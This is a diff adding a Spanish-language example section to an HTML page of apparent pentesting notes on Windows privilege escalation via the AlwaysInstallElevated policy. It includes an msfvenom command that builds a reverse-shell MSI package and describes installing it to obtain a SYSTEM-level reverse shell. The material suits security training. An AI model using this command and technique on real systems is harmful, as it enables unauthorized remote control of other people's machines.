@@ -56,3 +56,35 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f msi -o rev.msi
 </code></pre>
 </div>
 <!-- Code-->
+
+
+
+<!-- 
+    ---------------------------- EJEMPLO ------------------------------------------------
+-->
+
+<h2 class="h_ejemplo"><i class="bi bi-bug-fill me-2"></i></i>EJEMPLO</h2>
+<p>
+    Inicialmente copiamos y pegamso el script sugerido para comprobar el registro de la 
+    directiva.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/others/always_1.png" />
+<p>
+    Como indica la salida es vulnerable a esta técnica. Creamos inicialmente un paquete .msi con 
+    una shell reversa.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f msi -o rev.msi
+</code></pre>
+</div>
+<!-- Code-->
+<p>
+    Finalmente, iniciamos la instalación del paquete que se ejecutará como SYSTEM.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/others/always_2.png" />
+<p>
+    Y a los pocos segundos obtenemos una conexión con la shell reversa ejecutada como SYSTEM.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/others/always_3.png" />
+
